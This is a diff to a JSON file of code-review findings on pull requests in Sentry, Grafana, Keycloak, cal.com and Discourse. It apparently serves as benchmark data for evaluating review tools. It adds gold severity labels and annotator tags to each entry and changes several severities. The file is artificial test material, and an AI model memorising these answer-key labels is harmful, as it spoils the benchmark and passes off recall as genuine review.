@@ -14,7 +14,9 @@
     "relevantLinesStart": 10,
     "relevantLinesEnd": 12,
     "suggestionContent": "The comment 'TODO: This will be a stateful detector when we build that abstraction' is now stale. MetricAlertDetectorHandler already subclasses StatefulDetectorHandler. Remove or reword the TODO."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "ref-crons-reorganize-incident-creation-issue-occurrence-logic-sentry#01",
@@ -29,12 +31,14 @@
     "relevantLinesStart": 131,
     "relevantLinesEnd": 137,
     "suggestionContent": "The get_failure_reason docstring examples don't match the output. It shows 'A failed check-in was detected' and '...were detected', but the code returns the per-status singular strings ('A missed check-in was detected') or '<list> check-ins detected'. Update the examples to the real output and fix the 'humam readible' typo."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "frontend-asset-optimization-grafana-codex#01",
    "caseId": "frontend-asset-optimization-grafana-codex",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "concurrency",
    "label": "bug",
@@ -44,7 +48,9 @@
     "relevantLinesStart": 48,
     "relevantLinesEnd": 48,
     "suggestionContent": "In GetWebAssets (lines 40-71), after upgrading to a write lock at line 48, the code does not re-check whether entryPointAssetsCache was populated while waiting for the lock. Concrete failure path: two non-dev requests hit a cold cache; request A acquires the write lock, loads assets successfully and sets the cache; request B then acquires the same lock and, lacking a second nil check, loads again. If B's load fails (file moved, transient FS/HTTP error), it assigns nil back to entryPointAssetsCache, invalidating A's successful population and forcing every subsequent request to reload (thundering herd). This is the root cause behind both the correctness bug and the serialized-reload performance symptom; a second nil check after acquiring the write lock is required."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#snapi-01",
@@ -59,12 +65,14 @@
     "relevantLinesStart": 99,
     "relevantLinesEnd": 103,
     "suggestionContent": "remove(...) now calls idpDelegate.getByAlias(alias) unconditionally before checking the alias cache. When the cached entry exists, this performs an extra database lookup that the previous code avoided; the cached IdentityProviderModel should be reused for invalidation instead."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-concurrent-group-access-to-prevent-nullpointerexception-keycloak#03",
    "caseId": "fix-concurrent-group-access-to-prevent-nullpointerexception-keycloak",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "test_gap",
    "label": "bug",
@@ -74,7 +82,9 @@
     "relevantLinesStart": 152,
     "relevantLinesEnd": 155,
     "suggestionContent": "The reader's stop flag is set only after every deletion succeeds, with no finally cleanup. If any remove() throws, the test exits while its non-daemon worker continues issuing group-list requests indefinitely, interfering with later tests and potentially preventing JVM shutdown. Place the stop signal and worker termination in a finally block around deletion."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "plugins-chore-renamed-instrumentation-middleware-to-metrics-middleware-grafana-codex#sncc-02",
@@ -89,7 +99,9 @@
     "relevantLinesStart": 22,
     "relevantLinesEnd": 23,
     "suggestionContent": "The FromContext doc is copied from New() and misdescribes the method. It does not add a 'given context' of key/values. It returns a logger carrying the contextual attributes stored in the context.Context (e.g. via log.WithContextualAttributes). Reword it so callers know that attributes set by middleware are what get attached."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "dual-storage-architecture-grafana-codex#10",
@@ -104,7 +116,9 @@
     "relevantLinesStart": 28,
     "relevantLinesEnd": 28,
     "suggestionContent": "The test name says creation happens \"only in the unified store\", but this case configures a successful Legacy.Create as well, and Mode3.Create launches that legacy write after the unified write succeeds. Rename the case to describe creation in both stores (with the legacy write asynchronous), so test output does not communicate the opposite of the mode-3 write contract."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "notification-rule-processing-engine-grafana-codex#kimi-02",
@@ -119,7 +133,9 @@
     "relevantLinesStart": 289,
     "relevantLinesEnd": 289,
     "suggestionContent": "Line 289 has a stray `// duplicate` comment next to `useIsGrafanaPromRuleEditable(rule)`; it appears to be a stray comment, not a code defect."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "sms-workflow-reminder-retry-count-tracking-cal-com#09",
@@ -134,12 +150,14 @@
     "relevantLinesStart": 178,
     "relevantLinesEnd": 197,
     "suggestionContent": "The retryCount increment is duplicated in the else-branch and catch."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry#04",
    "caseId": "enhanced-pagination-performance-for-high-volume-audit-logs-sentry",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "doc_defect",
    "label": "bug",
@@ -149,7 +167,9 @@
     "relevantLinesStart": 821,
     "relevantLinesEnd": 832,
     "suggestionContent": "Docstring lists 'Streamlined boundary condition handling', 'Optimized query path for large datasets', and 'maintaining backward compatibility', but get_result (845-886) is a copy of BasePaginator with only a negative-offset branch added — no streamlined handling or optimized path exists, and negative-offset slicing breaks prior cursor semantics. Doc describes behavior the function does not produce — align doc to code or implement the claimed handling."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "ref-crons-reorganize-incident-creation-issue-occurrence-logic-sentry#snloop-02",
@@ -164,7 +184,9 @@
     "relevantLinesStart": null,
     "relevantLinesEnd": null,
     "suggestionContent": "The `logger` objects are defined but never used. Remove them, or use them where logging is intended."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-add-calendar-cache-status-and-actions-22532-cal-com#05",
@@ -179,7 +201,9 @@
     "relevantLinesStart": 4,
     "relevantLinesEnd": 4,
     "suggestionContent": "This warning says updatedAt is added without a default and cannot be added to a nonempty table, but the migration actually supplies DEFAULT NOW(), explicitly handling existing rows. Remove or correct the warning so operators reviewing the migration are not incorrectly told that existing data makes it unsafe to run."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#snloop-01",
@@ -194,12 +218,14 @@
     "relevantLinesStart": 585,
     "relevantLinesEnd": 615,
     "suggestionContent": "The `message` variable in the catch block is now unused. This is dead code rather than a comment or string mismatch, so remove it or use it."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "comprehensive-workflow-reminder-management-for-booking-lifecycle-events-cal-com#14",
    "caseId": "comprehensive-workflow-reminder-management-for-booking-lifecycle-events-cal-com",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "style",
    "label": "bug",
@@ -209,7 +235,9 @@
     "relevantLinesStart": 1,
     "relevantLinesEnd": 10,
     "suggestionContent": "`Prisma` is imported as a value (line 9) but is no longer used anywhere in this file. This PR removed the only usages (`Prisma.BatchPayload` in the now-deleted `remindersToDelete` / `deleteReminderPromise` declarations), while the import was kept. WHY: the repo's ESLint `no-unused-vars` rule will fail CI/build for an unused import. HOW: remove `Prisma` from the import list (and keep `import type { PrismaPromise }` as a type-only import)."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-proper-handling-of-group-memberships-discourse-cursor#kimip-01",
@@ -224,7 +252,9 @@
     "relevantLinesStart": 65,
     "relevantLinesEnd": 82,
     "suggestionContent": "WHAT: add_members resolves each username with a separate User.find_by_username call inside a loop. WHY: Adding N members performs N user lookups plus N join inserts; the previous usernames= implementation loaded all relevant users in a single User.where(username: ...) query before persisting changes. HOW: Load matching users in one query (User.where(username: usernames.split(','))) and iterate over that result set."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-html-sanitizer-for-translated-message-resources-keycloak#pf-muse-C2",
@@ -239,7 +269,9 @@
     "relevantLinesStart": 150,
     "relevantLinesEnd": 159,
     "suggestionContent": "WHAT: santizeAnchors error message omits the key and file while the Illegal HTML message includes them. WHY: In a multi-file verifier run the anchor failure is unactionable — the offending key/file cannot be identified from the message. HOW: Include key and file in the message like the Illegal HTML branch does."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "span-buffer-multiprocess-enhancement-with-health-monitoring-sentry#05",
@@ -254,7 +286,9 @@
     "relevantLinesStart": 30,
     "relevantLinesEnd": 32,
     "suggestionContent": "The docstring says the flusher \"Creates one process per shard for parallel processing,\" but the code at lines 60-66 shares shards across a capped number of processes (num_processes = min(self.max_processes, len(buffer.assigned_shards)); each shard assigned via i % self.num_processes). With the new --flusher-processes default of 1, a single process handles every shard, so the documented contract is the opposite of the behaviour this PR introduces (confirmed by test_flusher_processes_limit, which asserts 4 shards served by 2 processes). Update the docstring to say shards are distributed across up to max_processes flusher processes."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-workflow-engine-add-in-hook-for-producing-occurrences-from-the-stateful-det-sentry#03",
@@ -269,12 +303,14 @@
     "relevantLinesStart": 226,
     "relevantLinesEnd": 233,
     "suggestionContent": "The evaluate() docstring still says it returns a list of `DetectorEvaluationResult`. The method now returns a dict mapping group key to `DetectorEvaluationResult`. Update the docstring to describe the dict return shape."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-convert-insightsbookingservice-to-use-prisma-sql-raw-queries-cal-com#01",
    "caseId": "feat-convert-insightsbookingservice-to-use-prisma-sql-raw-queries-cal-com",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -284,7 +320,9 @@
     "relevantLinesStart": 72,
     "relevantLinesEnd": 80,
     "suggestionContent": "WHAT: getBaseConditions() branches on `authConditions` truthiness, but getAuthorizationConditions() (line 83-88) is typed Promise<Prisma.Sql> and always returns a Prisma.Sql object — including the deny sentinel NOTHING_CONDITION (`1=0`, line 43), which is truthy. WHY: the `else if (filterConditions)` (line 76) and final `else` (line 78) branches can never execute; the author evidently expected authConditions to be nullable, so if getAuthorizationConditions is ever changed to return null, the filter-only branch would silently return filter conditions WITHOUT any authorization predicate — an unauthorized data exposure. HOW: make the authorization result explicitly nullable and combine defensively, e.g. `if (authConditions && filterConditions) ... else if (filterConditions && !authConditions) throw` or type auth as `Prisma.Sql | null` and keep the deny sentinel distinct."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-2fa-backup-codes-cal-com#04",
@@ -299,7 +337,9 @@
     "relevantLinesStart": 7,
     "relevantLinesEnd": 7,
     "suggestionContent": "The component in `BackupCode.tsx` is exported as `function TwoFactor` instead of `BackupCode`. WHAT: Wrong component identifier/copy-paste error. WHY: React DevTools and maintainers see the wrong name, and named imports from this module would fail. HOW: Rename the function to `BackupCode`."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "anonymous-add-configurable-device-limit-grafana-codex#opa-04",
@@ -314,7 +354,9 @@
     "relevantLinesStart": 72,
     "relevantLinesEnd": 73,
     "suggestionContent": "The doc comment says `updateDevice` updates a device \"updated between the given times\", but it takes only ctx and device. It computes the window internally as `device.UpdatedAt` minus 30 days to `device.UpdatedAt` plus one minute, and returns `ErrDeviceLimitReached` when no row matches, so callers reading the comment get the wrong contract."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#opa-01",
@@ -329,7 +371,9 @@
     "relevantLinesStart": 3,
     "relevantLinesEnd": 3,
     "suggestionContent": "The comment \"These are like 40kb\" appears to be copied from the phone input lazy loader. MultiEmail only uses existing UI components, so the size claim misleads readers about why it is lazy-loaded."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "advanced-sql-analytics-framework-grafana-codex#06",
@@ -344,7 +388,9 @@
     "relevantLinesStart": 22,
     "relevantLinesEnd": 26,
     "suggestionContent": "After replacing `duck.NewInMemoryDB()` with local `NewInMemoryDB()` and removing the duck import, the local `duckDB` still carries the old implementation name though it is no longer a duck DB. Rename to `db`/`sqlDB` (as done in sql_command.go) so identifier matches code."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "optimize-header-layout-performance-with-flexbox-mixins-discourse-cursor#kimi-01",
@@ -359,7 +405,9 @@
     "relevantLinesStart": 264,
     "relevantLinesEnd": 270,
     "suggestionContent": "`.small-action` is now a flex container, so `.topic-avatar` is a flex item and its `float: left` declaration is ignored by the flex layout algorithm. Remove the dead `float: left` from `.topic-avatar` since the horizontal placement is now handled by flexbox."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "span-buffer-multiprocess-enhancement-with-health-monitoring-sentry#10",
@@ -374,7 +422,9 @@
     "relevantLinesStart": 127,
     "relevantLinesEnd": 132,
     "suggestionContent": "WHAT: `_create_process_for_shard(self, shard)` is defined but never called anywhere (grep finds only the definition; `_ensure_processes_alive` calls `_create_process_for_shards` directly). WHY: the intended 'restart only the process that owns a given shard' restart path is unreachable, leaving unused code that suggests the shard-level restart wiring was meant to be used and never got connected. HOW: remove the method, or wire `_ensure_processes_alive` to restart only the affected process if per-shard restart is the goal."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#11",
@@ -389,7 +439,9 @@
     "relevantLinesStart": 252,
     "relevantLinesEnd": 256,
     "suggestionContent": "getLoginPredicate now also filters on organization link plus the BROKER_PUBLIC config (line 254), but the enum's javadoc directly above (lines 215-217) still states that the enum \"contains all fields that are considered when deciding if a provider should be available for login or not\", presenting ENABLED/LINK_ONLY/HIDE_ON_LOGIN as the exhaustive criteria. Any reader — or a future LoginFilter constant added against that documented assumption — will believe organization link and BROKER_PUBLIC play no role. Update the javadoc to include the organization-link/public-broker condition, or move the condition into a documented LoginFilter constant."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "ref-crons-reorganize-incident-creation-issue-occurrence-logic-sentry#02",
@@ -404,12 +456,14 @@
     "relevantLinesStart": 159,
     "relevantLinesEnd": 171,
     "suggestionContent": "get_monitor_environment_context() builds a modified config copy but returns the unmodified monitor.config. WHAT: The local `config` variable (where schedule_type is replaced with its display string) is discarded. WHY: Issue occurrence context will contain the raw schedule_type value instead of the human-readable display string, contradicting the function's evident intent. HOW: Return `config` instead of `monitor_environment.monitor.config` on line 168."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-proper-handling-of-group-memberships-discourse-cursor#03",
    "caseId": "fix-proper-handling-of-group-memberships-discourse-cursor",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -419,7 +473,9 @@
     "relevantLinesStart": 20,
     "relevantLinesEnd": 21,
     "suggestionContent": "findMembers returns undefined when the group name is empty, breaking the old promise contract (previously Ember.RSVP.resolve([])). Any caller or test that chains .then() on the result will throw. Return Ember.RSVP.resolve([]) or Ember.RSVP.resolve() instead."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "implement-recovery-key-support-for-user-storage-providers-keycloak#oph-03",
@@ -434,7 +490,9 @@
     "relevantLinesStart": 244,
     "relevantLinesEnd": 244,
     "suggestionContent": "The error log hard-codes the credential type as \"recovery-codes\", but RecoveryAuthnCodesCredentialModel.TYPE is \"recovery-authn-codes\". Anyone reading the log or searching for the type will be pointed at a type that does not exist. Use the constant so the message stays correct."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#05",
@@ -449,7 +507,9 @@
     "relevantLinesStart": 1,
     "relevantLinesEnd": 27,
     "suggestionContent": "The file names and contents are swapped. embeddable_host_fabricator.rb defines the category fabricators (:category, :diff_category, :happy_category, :private_category), and category_fabricator.rb defines :embeddable_host. Restore category_fabricator.rb to the original category fabricators and put the :embeddable_host fabricator in embeddable_host_fabricator.rb."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "scale-color-lightness-must-use-secondary-for-dark-themes-discourse-cursor#07",
@@ -464,7 +524,9 @@
     "relevantLinesStart": 72,
     "relevantLinesEnd": 76,
     "suggestionContent": "The comment at lines 72-74 states \"the default for table cells in topic list is scale-color($primary, $lightness: 50%)\", but the rule it documents was converted by this PR to `dark-light-choose(scale-color($primary, $lightness: X%), scale-color($secondary, $lightness: 100-X%))` (here for coldmap-high/med/low and in common/base/_topic-list.scss th/td). The prose still names a single `$primary` expression, so it no longer describes the code: a reader comparing the two will look for a plain `$primary` 50% rule that no longer exists. Update the comment to describe the dark-light-choose baseline (e.g. \"is dark-light-choose(scale-color($primary, $lightness: 50%), scale-color($secondary, $lightness: 50%))\")."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "authzservice-improve-authz-caching-grafana-codex#08",
@@ -479,7 +541,9 @@
     "relevantLinesStart": 55,
     "relevantLinesEnd": 58,
     "suggestionContent": "The struct doc comment still reads \"// Cache for user permissions, user team memberships and user basic roles\", but this PR added the new `permDenialCache` field (line 58). The comment no longer enumerates what the struct actually holds and misleads a reader about the new denial-cache field; update it to mention the permission-denial cache so the prose matches the fields."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "comprehensive-workflow-reminder-management-for-booking-lifecycle-events-cal-com#11",
@@ -494,12 +558,14 @@
     "relevantLinesStart": 197,
     "relevantLinesEnd": 232,
     "suggestionContent": "`deleteScheduledEmailReminder` and its `immediateDelete` flag no longer match what the code does. The default path only marks the reminder `cancelled: true`, and the `immediateDelete` path only sends a cancel request to the email provider. Neither path deletes the scheduled send or the row, unlike the SMS counterpart, which still deletes. Rename them (for example `cancelScheduledEmailReminder` and `immediateCancel`) or document the behaviour."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "unified-storage-performance-optimizations-grafana-codex#03",
    "caseId": "unified-storage-performance-optimizations-grafana-codex",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "bug",
    "label": "bug",
@@ -509,12 +575,14 @@
     "relevantLinesStart": 258,
     "relevantLinesEnd": 262,
     "suggestionContent": "WHAT: NewResourceServer calls s.Init(ctx) but on error returns nil,err without invoking s.cancel (or Stop), leaking the cancellable watcher context and any partially started lifecycle/search watch resources. WHY: Failed construction leaves the context.Background-derived s.ctx and its goroutines (broadcaster/search watch) uncancelled with no handle to clean up, leaking resources on every failed startup/index-build attempt. HOW: On Init error call s.cancel() (or defer cleanup) before returning nil,err."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "implement-access-token-context-encoding-framework-keycloak#03",
    "caseId": "implement-access-token-context-encoding-framework-keycloak",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "doc_defect",
    "label": "bug",
@@ -524,7 +592,9 @@
     "relevantLinesStart": 74,
     "relevantLinesEnd": 81,
     "suggestionContent": "The decoder hardcodes a 6-character context split as 2/2/2, i.e. it requires the grant shortcut to be exactly 2 characters, but the newly added OAuth2GrantTypeFactory.getShortcut javadoc states the shortcut is \"usually like 3-letters\". A custom grant that follows the documented guidance (e.g. 3-char shortcut) makes encodeTokenId emit a 7-char context whose own access token id then throws IllegalArgumentException(\"Expected length of 6\") on decode (used by introspection/userInfo paths). Either make the grant shortcut length contract explicit/enforced (validate getShortcut length == 2 at registration) or make the decoder derive the grant-shortcut segment length instead of assuming 2."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "implement-recovery-key-support-for-user-storage-providers-keycloak#pf-ds-C1",
@@ -539,12 +609,14 @@
     "relevantLinesStart": 235,
     "relevantLinesEnd": 246,
     "suggestionContent": "WHAT: getCredentials() rebuilds the recovery-codes model with RecoveryAuthnCodesCredentialModel.createFromValues(...), which hashes the codes and always reproduces them in original order, so the model returned by the federated store never reflects consumed codes. WHY: RecoveryAuthnCodeInputLoginBean derives the 'next code to enter' number from this model and RecoveryAuthnCodesFormAuthenticator relies on allCodesUsed() to decide whether to remove the credential; with a freshly rebuilt model the displayed code number can be stale and the removal branch is driven by clone state rather than persisted state, producing wrong results for federated users. HOW: Persist and rehydrate the hashed secretData (and consumed-code state) instead of regenerating it from the raw list on each read."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "sms-workflow-reminder-retry-count-tracking-cal-com#sncc-01",
    "caseId": "sms-workflow-reminder-retry-count-tracking-cal-com",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "FP nit",
    "category": "perf",
    "label": "performance",
@@ -554,13 +626,14 @@
     "relevantLinesStart": 158,
     "relevantLinesEnd": 188,
     "suggestionContent": "`retryCount` is only incremented when `scheduleSMS` fails. If `message` is empty or `sendTo` is missing, as with an invalid or absent phone number, the `if (message?.length && sendTo)` block is skipped and nothing is incremented. These reminders are retried on every cron run until their date passes, which is the problem the PR sets out to fix. Add an `else` branch that increments `retryCount` when the message or recipient is missing."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor#07",
    "caseId": "add-comprehensive-email-validation-for-blocked-users-discourse-cursor",
    "severity": "medium",
-   "severityBefore": "low",
    "classReviewed": "FP nit",
    "category": null,
    "label": "bug",
@@ -570,12 +643,14 @@
     "relevantLinesStart": 22,
     "relevantLinesEnd": 24,
     "suggestionContent": "This test is named \"returns false if a record with the email doesn't exist,\" but it cannot verify that. `BlockedEmail.should_block?` returns `record && record.action_type == actions[:block]`, which yields `nil` (not `false`) when no record exists, and under this suite's RSpec 2 semantics `subject.should be_false` is a truthiness matcher that passes for any falsy value including `nil`. The assertion therefore passes on the nil the code actually returns and would only fail on an outright `true`; it does not pin the `false`/`nil` distinction its name asserts. Assert the value exactly (e.g. `subject.should == false`, or `be_falsey`/`be_nil` if nil is intended) so a regression returning a non-false falsy value is caught."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak#02",
    "caseId": "add-caching-support-for-identityproviderstorageprovider-getforlogin-operations-keycloak",
-   "severity": "low",
+   "severity": "medium",
    "classReviewed": "TP",
    "category": "bug",
    "label": "bug",
@@ -585,7 +660,9 @@
     "relevantLinesStart": 381,
     "relevantLinesEnd": 381,
     "suggestionContent": "WHAT: The test-cleanup registration uses the hard-coded alias \"alias\" instead of the IDP alias actually created in the loop (\"idp-alias-\" + i). WHY: testRealm().identityProviders().get(\"alias\")::remove targets a non-existent alias, so none of the 20 IDPs created by this test are removed during cleanup; they leak into the shared test realm and can break count/alias assertions in sibling tests in the same class, producing flaky failures. HOW: register the created alias, e.g. getCleanup().addCleanup(testRealm().identityProviders().get(\"idp-alias-\" + i)::remove) (same problem at line 425, which again uses get(\"alias\"))."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "plugins-chore-renamed-instrumentation-middleware-to-metrics-middleware-grafana-codex#06",
@@ -600,7 +677,9 @@
     "relevantLinesStart": 21,
     "relevantLinesEnd": 21,
     "suggestionContent": "Test function still named TestInstrumentationMiddleware but it constructs and asserts MetricsMiddleware (newMetricsMiddleware). Rename to TestMetricsMiddleware to match the renamed middleware."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-2fa-backup-codes-cal-com#15",
@@ -615,7 +694,9 @@
     "relevantLinesStart": 94,
     "relevantLinesEnd": 99,
     "suggestionContent": "WHAT: A blob URL for backup codes is created on setup success but is only revoked when a later setup replaces it; closing or cancelling the modal does not revoke it. WHY: Each 2FA setup leaks a browser object URL that remains allocated for the lifetime of the page/session if the user does not rerun setup. HOW: Revoke the current backupCodesUrl in a cleanup useEffect and/or in the modal-close/cancel handlers."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feat-upsampling-support-upsampled-error-count-with-performance-optimizations-sentry#09",
@@ -630,7 +711,9 @@
     "relevantLinesStart": 28,
     "relevantLinesEnd": 44,
     "suggestionContent": "`_are_all_projects_error_upsampled` takes an `organization` argument — also threaded in from the public `is_errors_query_for_error_upsampled_projects` — but never reads it: the body uses only `project_ids` and the global option `issues.client_error_sampling.project_allowlist`. The declared parameter is dead. Either the allowlist check is meant to be organization-scoped (the body must actually consult `organization`) or the parameter should be removed from both functions; as written the signature advertises an organization-scoped decision the implementation never makes."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "fix-handle-collective-multiple-host-on-destinationcalendar-cal-com#kimi-01",
@@ -645,13 +728,14 @@
     "relevantLinesStart": 228,
     "relevantLinesEnd": 231,
     "suggestionContent": "The string \"Notes have been hidden by the organizer\" is written directly into calEvent.additionalNotes and shown to users in calendar events, but it is not routed through the project's i18n system. The existing TODO even notes this. The PR changed the spelling of this line without resolving the localization gap, so attendees/organizers whose locale is not English still see an untranslated message. Replace the hard-coded string with a translated key (e.g., t(\"notes_hidden_by_organizer\")) and add it to the locale files."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-authzclientcryptoprovider-for-authorization-client-cryptographic-operations-keycloak#sncc-02",
    "caseId": "add-authzclientcryptoprovider-for-authorization-client-cryptographic-operations-keycloak",
    "severity": "medium",
-   "severityBefore": "low",
    "classReviewed": "FP nit",
    "category": null,
    "label": "bug",
@@ -661,7 +745,9 @@
     "relevantLinesStart": 60,
     "relevantLinesEnd": 67,
     "suggestionContent": "WHAT: getBouncyCastleProvider returns KeyStore.getInstance(KeyStore.getDefaultType()).getProvider() instead of a BouncyCastle provider or null. WHY: Breaks the CryptoProvider contract honored by Default/FIPS (BC provider) and Elytron (null); callers expecting a BC provider get the SUN/JKS provider, causing wrong-provider crypto operations. HOW: Return null (like WildFlyElytronProvider) or throw UnsupportedOperationException consistent with other unimplemented methods."
-   }
+   },
+   "severityGold": "medium",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#07",
@@ -676,7 +762,9 @@
     "relevantLinesStart": 142,
     "relevantLinesEnd": 147,
     "suggestionContent": "@return says 'Stream of IDs' but method returns Set<String> getGroupIdsWithViewPermission. Fix doc to 'Set of IDs' to match the signature."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-guest-management-functionality-to-existing-bookings-cal-com#12",
@@ -691,7 +779,9 @@
     "relevantLinesStart": 46,
     "relevantLinesEnd": 46,
     "suggestionContent": "The tooltip text \"Remove email\" is hard-coded English and bypasses the translation mechanism. The component already calls useLocale (t), and the neighbouring label uses t(\"add_another\"). Add a locale key and use t(...) here."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "dual-storage-architecture-grafana-codex#01",
@@ -706,7 +796,9 @@
     "relevantLinesStart": 94,
     "relevantLinesEnd": 98,
     "suggestionContent": "WHAT: Delete puts d.Log instead of the per-request log into klog.NewContext, dropping name/kind/method fields. WHY: Request-scoped log correlation for deletes is lost while all sibling methods propagate it, breaking tracing/debugging for that path. HOW: Change klog.NewContext(ctx, d.Log) to klog.NewContext(ctx, log)."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-groups-resource-type-and-scopes-to-authorization-schema-keycloak#06",
@@ -721,7 +813,9 @@
     "relevantLinesStart": 132,
     "relevantLinesEnd": 135,
     "suggestionContent": "The Javadoc for requireManageMembers says it throws if canManageMembership(GroupModel) returns false. It should refer to canManageMembers(GroupModel), which is a different check, so the doc misdescribes the method."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "feature-can-edit-category-host-relationships-for-embedding-discourse-cursor#kimi-04",
@@ -736,7 +830,9 @@
     "relevantLinesStart": 23,
     "relevantLinesEnd": 23,
     "suggestionContent": "The describe block is named 'allows_embeddable_host' but the model method added in this PR is 'host_allowed?'. The test description names a non-existent method, which is confusing and will break navigation/expectations. Rename the describe block to 'host_allowed?' to match the actual API."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "sms-workflow-reminder-retry-count-tracking-cal-com#03",
@@ -751,7 +847,9 @@
     "relevantLinesStart": 28,
     "relevantLinesEnd": 44,
     "suggestionContent": "Stale comment: line 28 says 'delete all scheduled sms reminders where scheduled date is past current date' but the new OR clause also deletes any reminder with retryCount > 1 regardless of method or date. Update the comment to describe both branches."
-   }
+   },
+   "severityGold": "low",
+   "labelBy": "astra"
   },
   {
    "issueId": "add-html-sanitizer-for-translated-message-resources-keycloak#06",
@@ -766,7 +864,9 @@
     "relevantLinesStart": 102,
     "relevantLinesEnd": 111,
